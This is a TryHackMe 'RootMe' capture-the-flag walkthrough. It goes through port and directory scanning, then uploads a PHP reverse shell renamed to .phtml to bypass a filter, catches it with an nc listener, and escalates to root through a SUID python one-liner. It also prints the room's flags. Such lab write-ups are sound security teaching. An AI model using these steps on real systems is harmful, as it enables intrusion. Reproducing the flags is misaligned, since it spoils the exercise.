@@ -1,0 +1,112 @@
+THM-RootMe Walkthrough
+First I start by running nmap scan with the command
+
+nmap -sC -sV 10.10.216.94
+
+
+
+so as we can see we have 2 ports open on the machine
+
+the first answer: 2
+
+we can see the version of the apache 2.4.29
+
+the second answer: 2.4.29
+
+as we know port 22 is ssh protocol
+
+the third answer: ssh
+
+our next mission is to find directories on the web server
+
+to find the directories I will use a tool called “GoBuster”
+
+the commend that I use is gobuster dir — url http://10.10.216.94 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+
+
+
+we can see the /panel is a secret directory
+
+and this is the Fourth answer: /panel
+
+so now I go to the website
+
+
+and try to see the secret directory we found /panel
+
+
+so to get a reverse shell we need to use php reverse shell
+
+I went to this URL https://raw.githubusercontent.com/jivoi/pentest/master/shell/rshell.php
+
+and created this file on my machine
+
+and changed the ip and port I want to listen with nc
+
+
+
+if we try to upload this php file we see that we cant do this
+
+
+so we need to change this rshell.php to rshell.phtml
+
+mv rshell.php rshell.phtml
+
+
+and then we can see that we succeeded
+
+
+now I use nc -lnvp 9001
+
+and we got our reverse shell 😄
+
+
+I use the command find / -type f -name user.txt to find the file
+
+we can see where is the file
+
+
+in /var/www/user.txt
+
+and here is our flag
+
+
+answer: THM{y0u_g0t_a_sh3ll}
+
+Now that we have a shell, let’s escalate our privileges to root.
+
+now I use the command find / -type f -user root -perm -4000 2>/dev/null
+
+to find files with SUID permission
+
+
+and we found our answer
+
+
+answer: /usr/bin/python
+
+for the escalate our privileges I go to https://gtfobins.github.io/
+
+
+now I use the command ./python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’
+
+
+now we can go to root directory
+
+
+and the answer: THM{pr1v1l3g3_3sc4l4t10n}
+
+Thm
+
+Tryhackme
+
+Walkthrough
+
+rootme
+
+
+
+
+
+
+
